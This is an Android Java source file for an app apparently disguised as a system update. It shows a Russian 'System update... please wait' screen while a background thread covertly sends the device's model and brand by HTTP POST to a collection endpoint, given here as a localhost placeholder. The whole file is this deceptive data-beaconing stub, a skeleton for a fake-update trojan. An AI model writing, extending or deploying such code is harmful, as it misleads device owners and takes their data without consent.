package com.system.update;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView tv = new TextView(this);
        tv.setText("Обновление системы... Пожалуйста, подождите.");
        setContentView(tv);

        new Thread(new Runnable() {
            public void run() {
                try {
                    String targetUrl = "http://127.0.0.1:8080/connect"; 
                    
                    URL url = new URL(targetUrl);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    
                    String data = "model=" + android.os.Build.MODEL + "&brand=" + android.os.Build.BRAND;
                    OutputStream os = conn.getOutputStream();
                    os.write(data.getBytes());
                    os.flush();
                    os.close();
                    
                    conn.getResponseCode();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}

